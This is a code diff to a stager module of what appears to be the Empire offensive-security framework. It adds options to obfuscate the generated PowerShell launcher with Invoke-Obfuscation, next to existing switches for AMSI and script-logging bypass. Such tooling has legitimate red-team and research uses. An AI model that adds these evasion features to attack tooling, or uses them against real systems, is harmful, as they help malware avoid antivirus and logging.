@@ -78,6 +78,16 @@ class Stager(object):
                 'Required'      :   False,
                 'Value'         :   'True'
             },
+            'Obfuscate': {
+                'Description': 'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
+                'Required': False,
+                'Value': 'False'
+            },
+            'ObfuscateCommand': {
+                'Description': 'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
+                'Required': False,
+                'Value': r'Token\All\1'
+            },
             'AMSIBypass' : {
                 'Description'   :   'Include mattifestation\'s AMSI Bypass in the stager code.',
                 'Required'      :   False,
@@ -117,6 +127,8 @@ class Stager(object):
         # extract all of our options
         language = self.options['Language']['Value']
         listenerName = self.options['Listener']['Value']
+        obfuscate = self.options['Obfuscate']['Value']
+        obfuscateCommand = self.options['ObfuscateCommand']['Value']
         userAgent = self.options['UserAgent']['Value']
         proxy = self.options['Proxy']['Value']
         proxyCreds = self.options['ProxyCreds']['Value']
@@ -126,6 +138,10 @@ class Stager(object):
         scriptLogBypass = self.options['ScriptLogBypass']['Value']
         AMSIBypass = self.options['AMSIBypass']['Value']
         AMSIBypass2 = self.options['AMSIBypass2']['Value']
+
+        invokeObfuscation = False
+        if obfuscate.lower() == "true":
+            invokeObfuscation = True
 
         scriptLogBypassBool = False
         if scriptLogBypass.lower() == "true":
@@ -152,7 +168,7 @@ class Stager(object):
             pypayload = formStr("str", match)
 
         # generate the powershell launcher code
-        poshlauncher = self.mainMenu.stagers.generate_launcher(listenerName, language="powershell", encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries, scriptLogBypass=scriptLogBypassBool, AMSIBypass=AMSIBypassBool, AMSIBypass2=AMSIBypass2Bool)
+        poshlauncher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=True, obfuscate=invokeObfuscation, obfuscationCommand=obfuscateCommand, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries, safeChecks=safeChecks, scriptLogBypass=scriptLogBypassBool, AMSIBypass=AMSIBypassBool, AMSIBypass2=AMSIBypass2Bool)
 
         if poshlauncher == "":
             print(helpers.color("[!] Error in powershell launcher command generation."))
